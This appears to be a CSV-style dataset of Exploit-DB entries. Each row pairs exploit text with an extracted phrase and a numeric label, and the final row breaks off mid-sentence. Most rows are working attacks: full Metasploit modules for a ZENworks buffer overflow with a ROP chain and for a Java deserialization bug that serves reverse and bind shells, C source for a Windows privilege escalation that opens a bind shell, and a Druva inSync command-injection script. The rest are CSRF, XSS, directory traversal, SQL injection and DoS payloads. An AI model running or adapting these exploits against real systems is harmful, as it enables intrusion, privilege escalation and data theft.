11780,"Clain_TIger_CMS - Cross-Site Request Forgery =======================================================================                        Clain_TIger_CMS CSRF Vulnerability                                   =======================================================================    # Vulnerability found in- Admin module   # email         Pratulag@yahoo.com   # company       aksitservices   # Credit by     Pratul Agrawal   # Software      Clan Tiger_CMS   # Category  	  CMS / Portals   # Site p4ge     http://server/clantiger/index.php?module=login   # Greetz to     Gaurav, Prateek, Vivek, Sanjay, Sourabh, Varun (My Web Team)              #  Proof of concept   #     Targeted URL:  http://servername/clantiger/         Script to Delete the News content through Cross Site request forgery                  .  ................................................................................................................                             <html>                             <body>                                 <img src=http://server/clantiger/index.php?module=news&action=remove&id=[user ID] />                             </body>                           </html>                  .  ..................................................................................................................               After execution refresh the page and u can see that a added content is deleted automatically.",a malicious user,1
19931,"Novell ZENworks Configuration Management Preboot Service 0x06 - Remote Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x06 Buffer Overflow', 			'Description'    => %q{ 					This module exploits a remote buffer overflow in the ZENworks Configuration 				Management 10 SP2. The vulnerability exists in the Preboot service and can be 				triggered by sending a specially crafted packet with the opcode 0x06 				(PROXY_CMD_CLEAR_WS) to the 998/TCP port. The module has been successfully tested 				on Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2 				(DEP bypass). 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Stephen Fewer', # Vulnerability Discovery 					'juan' # Metasploit module 				], 			'References'     => 				[ 					[ 'OSVDB', '65361' ], 					[ 'BID', '40486' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-090/' ], 					[ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7005572' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process' 				}, 			'Payload'        => 				{ 					'BadChars' => """", 					'Space'=> 954, 					'DisableNops' => true, 					'PrependEncoder' => ""\x81\xC4\x54\xF2\xFF\xFF"" # add esp, -3500 				}, 			'Platform'       => ['win'], 			'Targets'        => 				[ 					[ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2', 						{ 							'Offset'            => 1084, 							'OffsetBottomStack' => 1119, 							'OffsetRop'         => 24, 							'Ret'               => 0x0040175a # add esp, 0x408 # ret - novell_pbserv.exe 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Mar 30 2010', 			'DefaultTarget'  => 0))  		register_options([Opt::RPORT(998)], self.class) 	end  	def junk(n=4) 		return rand_text_alpha(n).unpack(""V"").first 	end  	def nop 		return make_nops(4).unpack(""L"")[0].to_i 	end  	# rop chain generated with mona.py 	def create_rop_chain() 		rop_gadgets = 			[ 				0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll] 				0x00001000, # 0x00001000-> edx 				0x10062113, # POP ECX # RETN [zenimgweb.dll] 				0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll] 				0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll] 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll] 				0x1002fd05, # POP EBP # RETN [zenimgweb.dll] 				0x10043053, # & push esp #  ret  [zenimgweb.dll] 				0x1003cbf8, # POP EBX # RETN [zenimgweb.dll] 				0x00000001, # 0x00000001-> ebx 				0x00423eeb, # POP ECX # RETN [novell-pbserv.exe] 				0x00000040, # 0x00000040-> ecx 				0x1003173e, # POP EDI # RETN [zenimgweb.dll] 				0x10020801, # RETN (ROP NOP) [zenimgweb.dll] 				0x00406b58, # POP EAX # RETN [novell-pbserv.exe] 				nop, 				0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll] 		].pack(""V*"")  		return rop_gadgets 	end   	def exploit 		connect  		buf = rand_text(target['OffsetRop']) 		buf << create_rop_chain 		buf << payload.encoded 		buf << rand_text(target['Offset'] - buf.length) 		buf << generate_seh_record(target.ret) 		buf << rand_text(target['OffsetBottomStack'] - buf.length)  		packet =  [0x6].pack(""N"") # Opcode # PROXY_CMD_CLEAR_WS 		packet << [buf.length].pack(""N"") # Length 		packet << buf # Value 		sock.put(packet)  		disconnect 	end end",sending,0
1197,"Microsoft Windows - 'keybd_event' Local Privilege Escalation /*  * Microsoft Windows keybd_event validation vulnerability.  *          Local privilege elevation  *  * Credits:    Andres Tarasco ( aT4r _@_ haxorcitos.com )  *             Iñaki Lopez    ( ilo _@_ reversing.org )  *  * Platforms afected/tested:  *  *     - Windows 2000  *     - Windows XP  *     - Windows 2003  *  *  * Original Advisory: http://www.haxorcitos.com  *                    http://www.reversing.org    *  * Exploit Date: 08 / 06 / 2005  *  * Orignal Advisory:  * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED ""AS IS""  * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION  * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.  *  * Attack Scenario:  *  * a) An attacker who gains access to an unprivileged shell/application executed  * with the application runas.  * b) An attacker who gains access to a service with flags INTERACT_WITH_DESKTOP  *  * Impact:  *  * Due to an invalid keyboard input validation, its possible to send keys to any  * application of the Desktop.  * By sending some short-cut keys its possible to execute code and elevate privileges  * getting loggued user privileges and bypass runas/service security restriction.  *  * Exploit usage:  *  * C:\>whoami  * AQUARIUS\Administrador  *  * C:\>runas /user:restricted cmd.exe  * Escribir contraseña para restricted:  * Intentando iniciar ""cmd.exe"" como usuario ""AQUARIUS\restricted""...  *  *  * Microsoft Windows 2000 [Versión 5.00.2195]  * (C) Copyright 1985-2000 Microsoft Corp.  *  * C:\WINNT\system32>cd \  *  * C:\>whoami  * AQUARIUS\restricted  *  * C:\>tlist.exe |find ""explorer.exe""  * 1140 explorer.exe      Program Manager  *  * C:\>c:\keybd.exe 1140  * HANDLE Found. Attacking =)  *  * C:\>nc localhost 65535  * Microsoft Windows 2000 [Versión 5.00.2195]  * (C) Copyright 1985-2000 Microsoft Corp.  *  * C:\>whoami  * whoami  * AQUARIUS\Administrador  *  *  * DONE =)  *  */  #include <stdio.h> #include <string.h> #include <winsock2.h> #pragma comment(lib, ""ws2_32.lib"")  #define HAXORCITOS 65535 unsigned int pid = 0; char buf[256]="""";  /**************************************************************/ void ExplorerExecution (HWND hwnd, LPARAM lParam){ 	DWORD hwndid;     int i;   	GetWindowThreadProcessId(hwnd,&hwndid);  	if (hwndid == pid){     /*       Replace keybd_event with SendMessage() and PostMessage() calls      */         printf(""HANDLE Found. Attacking =)\n"");         SetForegroundWindow(hwnd);         keybd_event(VK_LWIN,1,0,0);         keybd_event(VkKeyScan('r'),1,0,0);         keybd_event(VK_LWIN,1,KEYEVENTF_KEYUP,0);         keybd_event(VkKeyScan('r'),1,KEYEVENTF_KEYUP,0);         for(i=0;i<strlen(buf);i++) {             if (buf[i]==':') {                 keybd_event(VK_SHIFT,1,0,0);                 keybd_event(VkKeyScan(buf[i]),1,0,0);                 keybd_event(VK_SHIFT,1,KEYEVENTF_KEYUP,0);                 keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);             } else {                 if (buf[i]=='\\') {                     keybd_event(VK_LMENU,1,0,0);                     keybd_event(VK_CONTROL,1,0,0);                     keybd_event(VkKeyScan('º'),1,0,0);                     keybd_event(VK_LMENU,1,KEYEVENTF_KEYUP,0);                     keybd_event(VK_CONTROL,1,KEYEVENTF_KEYUP,0);                     keybd_event(VkKeyScan('º'),1,KEYEVENTF_KEYUP,0);                 } else {                     keybd_event(VkKeyScan(buf[i]),1,0,0);                     keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);                 }             }         }         keybd_event(VK_RETURN,1,0,0);         keybd_event(VK_RETURN,1,KEYEVENTF_KEYUP,0);         exit(1);     } } /**************************************************************/  int BindShell(void) { //Bind Shell. POrt 65535  	SOCKET				s,s2; 	STARTUPINFO			si;     PROCESS_INFORMATION pi; 	WSADATA				HWSAdata; 	struct				sockaddr_in sa; 	int					len;  	if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) { exit(1); } 	if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ exit(1); }      sa.sin_family		= AF_INET;     sa.sin_port			= (USHORT)htons(HAXORCITOS);     sa.sin_addr.s_addr	= htonl(INADDR_ANY);     len=sizeof(sa);     if ( bind(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) { return(-1); }     if ( listen(s, 1) == SOCKET_ERROR ) { return(-1); }     s2 = accept(s,(struct sockaddr *)&sa,&len);     closesocket(s);  	ZeroMemory( &si, sizeof(si) );  ZeroMemory( &pi, sizeof(pi) ); 	si.cb			= sizeof(si); 	si.wShowWindow  = SW_HIDE;     si.dwFlags		=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;     si.hStdInput	= (void *) s2; // SOCKET     si.hStdOutput	= (void *) s2;     si.hStdError	= (void *) s2;     if (!CreateProcess( NULL ,""cmd.exe"",NULL, NULL,TRUE, 0,NULL,NULL,&si,&pi)) {         doFormatMessage(GetLastError());         return(-1);     }      WaitForSingleObject( pi.hProcess, INFINITE ); 	closesocket(s); 	closesocket(s2);     printf(""SALIMOS...\n"");     Sleep(5000);     return(1);   } /**************************************************************/ void main(int argc, char* argv[]) {     HWND console_wnd = NULL;      	if (argc >= 2) {         pid = atoi (argv[1]);         strncpy(buf,argv[0],sizeof(buf)-1); 	    EnumWindows((WNDENUMPROC)ExplorerExecution,(long)(&console_wnd));     } else {         BindShell();     } } /**************************************************************/  // milw0rm.com [2005-09-06]",sending some shortcut keys,1
41656,"Microsoft GDI+ - 'gdiplus!GetRECTSForPlayback' Out-of-Bounds Read (MS17-013) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1042  We have encountered a crash in the Windows GDI+ library, in the gdiplus!GetRECTSForPlayback function, while trying to display a malformed EMF+ image file:  --- (6be8.6f1c): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=ffffadd6 ecx=000c1000 edx=00000000 esi=0000348f edi=00000000 eip=6c83a189 esp=0023f21c ebp=0023f238 iopl=0         nv up ei pl nz ac pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216 gdiplus!GetRECTSForPlayback+0xe2: 6c83a189 8a11            mov     dl,byte ptr [ecx]          ds:002b:000c1000=?? 0:000> kb ChildEBP RetAddr  Args to Child               0023f238 6c83c8a3 000001e0 00000018 00000800 gdiplus!GetRECTSForPlayback+0xe2 0023f294 6c8387e3 07b6bcb0 0000403a 00008800 gdiplus!SetTSClipEPR::Play+0x71 0023f2b4 6c83a88d 0000403a 00008800 00000018 gdiplus!GdipPlayMetafileRecordCallback+0x35 0023f2e4 6c83e32c 00000278 000c013c 000c0000 gdiplus!MetafilePlayer::EnumerateEmfPlusRecords+0x73 0023f2fc 76cd58a4 070125f7 04e18ff8 000c0098 gdiplus!EnumEmfWithDownLevel+0x61 0023f388 6c83abb4 070125f7 403581b3 6c83e2cb GDI32!bInternalPlayEMF+0x6a3 0023f3c0 6c83e5b1 070125f7 08462d83 0023f440 gdiplus!MetafilePlayer::EnumerateEmfRecords+0x104 0023f460 6c83f592 42776037 08462d83 0023f598 gdiplus!GpGraphics::EnumEmfPlusDual+0x1e7 0023f5b0 6c8448c9 00000000 42cc0000 42d80000 gdiplus!GpMetafile::EnumerateForPlayback+0x778 0023f6ac 6c84494d 07b65f28 00000000 00000000 gdiplus!GpGraphics::DrawImage+0x3f5 0023f710 6c80e03f 07b65f28 0023f738 0023f748 gdiplus!GpGraphics::DrawImage+0x51 0023f778 6c80e0d3 07b61d28 4269b097 00000000 gdiplus!GdipDrawImage+0x130 0023f7a4 000e1747 07b61d28 07b65f28 00000000 gdiplus!GdipDrawImageI+0x49 [...] ---  The crash appears to be caused by insufficient validation of the record size in relation to the number of declared rectangles, in the handler of the EmfPlusSetTSClip EMF+ record. It is unclear if the bug can also lead to memory corruption (likely not), but it could still potentially lead to the disclosure of junk/out-of-bounds heap bytes.  The issue reproduces on Windows 7. It is easiest to reproduce with PageHeap enabled. In order to reproduce the problem with the provided samples, it might be necessary to use a custom program which displays images using GDI+, or any existing GDI+ client (such as Microsoft Office).  Attached is an archive with two samples, which trigger crashes at two different offsets within the gdiplus!GetRECTSForPlayback function.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41656.zip",a malformed EMF+ image file,1
24965,"KrisonAV CMS 3.0.1 - Multiple Vulnerabilities Advisory ID: HTB23150 Product: KrisonAV CMS Vendor: http://www.krisonav.com Vulnerable Version(s): 3.0.1 and probably prior Tested Version: 3.0.1 Vendor Notification: March 27, 2013  Vendor Patch: March 31, 2013  Public Disclosure: April 17, 2013  Vulnerability Type: Cross-Site Scripting [CWE-79], Cross-Site Request Forgery [CWE-352] CVE References: CVE-2013-2712, CVE-2013-2713 Risk Level: Medium  CVSSv2 Base Scores: 4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N), 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P) Solution Status: Fixed by Vendor Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in KrisonAV CMS, which can be exploited to perform cross-site scripting and cross-site request forgery attacks.   1) Cross-Site Scripting (XSS) vulnerability in KrisonAV CMS: CVE-2013-2712  The vulnerability exists due to insufficient filtration of user-supplied data passed to ""content"" HTTP GET parameter via ""/services/get_article.php"" script. A remote attacker can trick a logged-in user to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of the vulnerable website.  The exploitation example below uses JavaScript ""alert()"" function to display user's cookies:  http://[host]/services/get_article.php?content=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E   2) Сross-Site Request Forgery (CSRF) vulnerability in KrisonAV CMS: CVE-2013-2713  The vulnerability exists due to insufficient verification of the HTTP request origin in ""/users_maint.html"" script. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and create a new account with administrative privileges.  PoC (Proof-of-Concept) below will create a new account with login ""username"" and password ""password"":   <form action=""http://[host]/users_maint.html?itemid=52&maint=1&ccsForm=users"" method=""post"" name=""f1""> <input type=""hidden"" name=""disabledCheckBox"" value=""1""> <input type=""hidden"" name=""username"" value=""username""> <input type=""hidden"" name=""password"" value=""password""> <input type=""hidden"" name=""groups_index"" value=""20""> <input type=""hidden"" name=""email"" value=""newuser@mail.com""> <input type=""hidden"" name=""Button_Insert"" value=""Save""> <input type=""submit"" id=""btn""> </form> <script> document.f1.submit(); </script>   -----------------------------------------------------------------------------------------------  Solution:  Upgrade to KrisonAV CMS 3.0.2  More Information: http://www.krisonav.com/articles_show.html?articles_id=release-notes  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23150 - https://www.htbridge.com/advisory/HTB23150 - Multiple Vulnerabilities in KrisonAV CMS. [2] KrisonAV CMS - http://www.krisonav.com - KrisonAV is a content management system (CMS), which enables you to build Web sites and online applications. It is based on Codecharge Studio, that makes it extremely powerful and secure. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.   -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",a specially crafted link and execute arbitrary HTML and script code in user's browser in context of the vulnerable website,1
33951,"Baidu Spark Browser 26.5.9999.3511 - Remote Stack Overflow (Denial of Service) <!--  Baidu Spark Browser v26.5.9999.3511 Remote Stack Overflow Vulnerability (DoS)   Vendor: Baidu, Inc. Product web page: http://www.baidu.com Affected version: 26.5.9999.3511  Summary: Spark Browser is a free Internet browser with very sharp UIs and cool utilities. It's based on the Chromium technology platform, giving it fast browsing capabilities.  Desc: Spark Browser version 26.5.9999.3511 allows remote attackers to cause a denial of service (application crash) resulting in stack overflow via nested calls to the window.print javascript function.  -----------------------------------------------------------------  (153c.14f4): Stack overflow - code c00000fd (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000b0 ebx=003d0000 ecx=003d0000 edx=5000016b esi=00000000 edi=0000010c eip=77e0decf esp=03d23000 ebp=03d230c4 iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202 ntdll!memcpy+0xbb8f: 77e0decf 56              push    esi  -----------------------------------------------------------------  Tested on: Microsoft Windows 7 Professional SP1 (EN)            Microsoft Windows 7 Ultimate SP1 (EN)   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2014-5190 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5190.php   28.06.2014  -->   <html> <title>Baidu Spark Browser v26.5.9999.3511 Remote Stack Overflow DoS PoC</title> <body bgcolor=""#50708C""> <center> <p><font color=""#e3e3e3"">Baidu Spark Browser v26.5.9999.3511 Remote Stack Overflow DoS PoC</font></p> <button onClick=crash()>Execute!</button> </center> <script> function crash(){ 	window.print(); 	crash(); } </script> </body> </html>",nested calls to the window,1
28811,"Apple Motion 5.0.7 - Integer Overflow Apple Motion Integer Overflow Vulnerability ===========================================  Vendor: Apple (http://www.apple.com) Software: Motion 5.0.7 Testcase verified on: OS X 10.8  Credit: Jean Pascal Pereira <pereira@secbiz.de>  DESCRIPTION ===========  An integer overflow vulnerability has been identified in Apple Motion. The issue has been verified for Motion 5.0.7 (current release). Prior versions may also be affected.   An attacker has the possibility to provide a crafted .motn file containing a viewer element with a subview attribute. If the subview attribute is set to a very low or high integer value, the application crashes due an access violation.  Debug message:  Program received signal EXC_BAD_ACCESS, Could not access memory. Reason: KERN_INVALID_ADDRESS at address: 0x00000002dd6e0990 0x0000000100858eb7 in OZDocument::parseElement ()  The crash is triggered in the function OZDocument::parseElement() at the following instruction:  (gdb) x/i 0x0000000100858eb7  0x100858eb7 <_ZN10OZDocument12parseElementER22PCSerializerReadStreamR15PCStreamElement+695>:  mov rsi, QWORD PTR [rbx+rax*8+0x98]  The value of rax is controlled by the attacker (in this case, the rax register contains the integer 989894991 which is provided in the PoC below).   (gdb) p $rax $16 = 989894991  (gdb) p/x $rbx+($rax*8)+0x98 $1 = 0x2dd6e0990  PROOF OF CONCEPT ================  Create a .motn file with the following content:  <?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE ozxmlscene> <ozml version=""5.5""> <viewer subview=""989894991""> </viewer> </ozml>  DISCLOSURE TIMELINE =================== 2013/09/18: Vendor notified 2013/10/07: Public disclosure",provide a crafted .motn file containing a viewer element with a subview attribute,1
20323,"Cisco IOS 12 - Software '?/' HTTP Request Denial of Service source: https://www.securityfocus.com/bid/1838/info   Cisco devices running IOS software may be prone to a denial of service attack if a URL containing a question mark followed by a slash (?/) is requested. The device will enter an infinite loop when supplied with a URL containing a ""?/"" and an enable password. Subsequently, the router will crash in two minutes after the watchdog timer has expired and will then reload. In certain cases, the device will not reload and a restart would be required in order to regain normal functionality.  This vulnerability is restricted to devices that do not have the enable password set or if the password is known or can be easily predicted. The vulnerable service is only on by default in the Cisco 1003, 1004 and 1005 routers.   Users can identify vulnerable or invulnerable devices running IOS by logging onto the device and issuing the ?show version? command. If IOS is running on a vulnerable device the command will return ?Internetwork Operating System Software? or ?IOS (tm)? with a version number.  Vulnerable IOS software may be found on the following Cisco devices:  *Cisco routers in the AGS/MGS/CGS/AGS+, IGS, RSM, 800, ubr900, 1000, 1400, 1500, 1600, 1700, 2500, 2600, 3000, 3600, 3800, 4000, 4500, 4700, AS5200, AS5300, AS5800, 6400, 7000, 7200, ubr7200, 7500, and 12000 series. *Recent versions of LS1010 ATM switch.  *Catalyst 6000 with IOS. *Catalyst 2900XL LAN switch with IOS. *Cisco DistributedDirector.  http://target/anytext?/",a URL containing a question mark followed by a slash (?/) is requested,1
9948,"Sun Java Runtime and Development Kit 6 Update 10 - Calendar Deserialization (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to  # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core' require 'rex'  class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::HttpServer::HTML 	 	def initialize( info = {} ) 	 		super( update_info( info, 			'Name'					=> 'Sun Java Calendar Deserialization Exploit', 			'Description'		=> %q{ 				This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM. 				 				The payload can be either a native payload which is generated as an executable and  				dropped/executed on the target or a shell from within the Java applet in the target browser. 				 				The effected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16  				and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected). 			}, 			'License'				=> MSF_LICENSE, 			'Author'				=> [ 'sf', 'hdm' ], 			'Version'       => '1', 			'References'		=>  			[ 				[ 'CVE', '2008-5353' ], 				[ 'OSVDB', '50500'], 				[ 'URL', 'http://slightlyrandombrokenthoughts.blogspot.com/2008/12/calendar-bug.html' ], 				[ 'URL', 'http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html' ], 				[ 'URL', 'http://blog.cr0.org/2009/05/write-once-own-everyone.html' ], 				[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-244991-1' ]  			], 			'Platform'     => [ 'win', 'osx', 'linux', 'solaris' ], 			'Payload'      => { 'Space' => 2048, 'BadChars' => '', 'DisableNops' => true }, 			'Targets'      => 				[ 					[ 'Generic (Java Payload)',  						{ 							# This is a bad hack to force only the generic/shell_bind_tcp and generic/shell_reverse_tcp payloads 							'Platform' => ['win'], 							'Payload' => { 'Space' => 0 }, 							'Arch' => ARCH_CMD, 						} 					], 					[ 'Windows x86 (Native Payload)',  						{ 							'Platform' => 'win', 							'Arch' => ARCH_X86, 						} 					], 					[ 'Mac OS X PPC (Native Payload)',  						{ 							'Platform' => 'osx', 							'Arch' => ARCH_PPC, 						} 					], 					[ 'Mac OS X x86 (Native Payload)',  						{ 							'Platform' => 'osx', 							'Arch' => ARCH_X86, 						} 					], 					[ 'Linux x86 (Native Payload)',  						{ 							'Platform' => 'linux', 							'Arch' => ARCH_X86,  						} 					], 				], 			'DefaultTarget'	=> 0 			)) 	end   	def on_request_uri( cli, request ) 		data = nil 		host = nil 		port = nil  		if not request.uri.match(/\.jar$/i) 			if not request.uri.match(/\/$/) 				send_redirect( cli, get_resource() + '/', '') 				return 			end 			 			print_status( ""Handling request from #{cli.peerhost}:#{cli.peerport}..."" ) 			 			payload = regenerate_payload( cli ) 			if not payload 				print_status( ""Failed to generate the payload."" ) 				return 			end 			 			if target.name == 'Generic (Java Payload)' 				if datastore['LHOST'] 					host = datastore['LHOST'] 					port = datastore['LPORT'] 					print_status( ""Payload will be a Java reverse shell to #{host}:#{port} from #{cli.peerhost}..."" ) 				else 					port = datastore['LPORT'] 					datastore['RHOST'] = cli.peerhost 					print_status( ""Payload will be a Java bind shell on #{cli.peerhost}:#{port}..."" ) 				end 			else 			 				if target['Arch'] == ARCH_X86 					data = Msf::Util::EXE.to_win32pe( framework, payload.encoded ) if target['Platform'] == 'win' 					data = Msf::Util::EXE.to_osx_x86_macho( framework, payload.encoded ) if target['Platform'] == 'osx'  					data = Msf::Util::EXE.to_linux_x86_elf( framework, payload.encoded ) if target['Platform'] == 'linux' 				elsif target['Arch'] == ARCH_PPC 					data = Msf::Util::EXE.to_osx_ppc_macho( framework, payload.encoded ) if target['Platform'] == 'osx' 				end 				 				if data 					print_status( ""Generated executable to drop (#{data.length} bytes)."" ) 					data = Rex::Text.to_hex( data, prefix="""" ) 				else 					print_status( ""Failed to generate the executable."" ) 					return 				end 				 			end 			 			send_response_html( cli, generate_html( data, host, port ), { 'Content-Type' => 'text/html' } )	 			return 		end 		 		print_status( ""Sending Applet.jar to #{cli.peerhost}:#{cli.peerport}..."" )	 		send_response( cli, generate_jar(), { 'Content-Type' => ""application/octet-stream"" } )  		handler( cli ) 	end 	 	def generate_html( data, host, port ) 		html  = ""<html><head><title>Loading, Please Wait...</title></head>"" 		html += ""<body><center><p>Loading, Please Wait...</p></center>"" 		html += ""<applet archive=\""Applet.jar\"" code=\""msf.x.AppletX.class\"" width=\""1\"" height=\""1\"">"" 		html += ""<param name=\""data\"" value=\""#{data}\""/>"" if data 		html += ""<param name=\""lhost\"" value=\""#{host}\""/>"" if host 		html += ""<param name=\""lport\"" value=\""#{port}\""/>"" if port 		html += ""</applet></body></html>"" 		return html 	end 	 	def generate_jar() 		path = File.join( Msf::Config.install_root, ""data"", ""exploits"", ""CVE-2008-5353.jar"" ) 		fd = File.open( path, ""rb"" ) 		data = fd.read(fd.stat.size) 		fd.close 		return data 	end 	 end",a specially crafted .jar file,1
48400,"Druva inSync Windows Client 6.5.2 - Local Privilege Escalation # Exploit Title: Druva inSync Windows Client 6.5.2 - Local Privilege Escalation # Date: 2020-04-28 # Exploit Author: Chris Lyne # Vendor Homepage: druva.com # Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.5.2/inSync6.5.2r99097.msi # Version: 6.5.2 # Tested on: Windows 10 # CVE : CVE-2019-3999 # See also: https://www.tenable.com/security/research/tra-2020-12  import socket import struct import sys  # Command injection in inSyncCPHwnet64 RPC service # Runs as nt authority\system. so we have a local privilege escalation  if len(sys.argv) < 2:     print ""Usage: "" + __file__ + "" <quoted command to execute>""     print ""E.g. "" + __file__ + "" \""net user /add tenable\""""     sys.exit(0)  ip = '127.0.0.1' port = 6064 command_line = sys.argv[1]  # command gets passed to CreateProcessW def make_wide(str):     new_str = ''     for c in str:         new_str += c         new_str += '\x00'     return new_str  hello = ""inSync PHC RPCW[v0002]"" func_num = ""\x05\x00\x00\x00""      # 05 is to run a command command_line = make_wide(command_line) command_length = struct.pack('<i', len(command_line))  # send each request separately requests = [ hello, func_num, command_length, command_line ]  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ip, port))  i = 1 for req in requests:     print 'Sending request' + str(i)     sock.send(req)     i += 1  sock.close()  print ""Done.""",any executable malicious file,1
42707,"Carel PlantVisor 2.4.4 - Directory Traversal #######################################################################                               Luigi Auriemma  Application:  Carel PlantVisor               http://www.carel.com/carelcom/web/eng/catalogo/prodotto_dett.jsp?id_prodotto=310 Versions:     <= 2.4.4 Platforms:    Windows Bug:          directory traversal Exploitation: remote Date:         13 Sep 2011 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's homepage: ""PlantVisor Enhanced is monitoring and telemaintenance software for refrigeration and air-conditioning systems controlled by CAREL instruments.""   #######################################################################  ====== 2) Bug ======   CarelDataServer.exe is a web server listening on port 80.  The software is affected by a directory traversal vulnerability that allows to download the files located on the disk where it's installed. Both slash and backslash and their HTTP encoded values are supported.   #######################################################################  =========== 3) The Code ===========   http://SERVER/..\..\..\..\..\..\boot.ini http://SERVER/../../../../../../boot.ini http://SERVER/..%5c..%5c..%5c..%5c..%5c..%5cboot.ini http://SERVER/..%2f..%2f..%2f..%2f..%2f..%2fboot.ini   #######################################################################  ====== 4) Fix ======   No fix.   #######################################################################",a specially crafted GET request,1
1682,"Fuju News 1.0 - Authentication Bypass / SQL Injection <?php /*   |---==============================================================---|  |                          /\¯\__       /\¯\                         |     |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |      |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |      |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |       |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |        |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |       |                                     >> Internet Security           |                           |---==============================================================---|           title: fuju news 1.0 remote sql injection       release: 2006-04-16        author: snatcher [snatcher at gmx.ch]       country: switzerland  |+| 	     application: Fuju News 1.0   description: a php / mysql based newsscript      download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=243   description: you can get the password with a simple sql injection.        greets: honkey, str0ke <- good exploit publisher :), 			   all security guys and coders over the world  terms of use: this exploit is just for educational purposes, do not use it for illegal acts.   ---------------------------- archiv2.php - line 25 -------------------------------------- $result1 =@mysql_query(""SELECT * FROM news_sql WHERE ID LIKE $ID""); -----------------------------------------------------------------------------------------  because this $ID isn't escaped correctly you can insert malicious sql code, i.e. with a union operator.   title: fuju news 1.0 restriction bypass  ------------------------- edit_kategorie.php - line 19 ---------------------------------- $authorized=$HTTP_COOKIE_VARS['authorized']; -----------------------------------------------------------------------------------------  that's the mistake of the code. you only have to 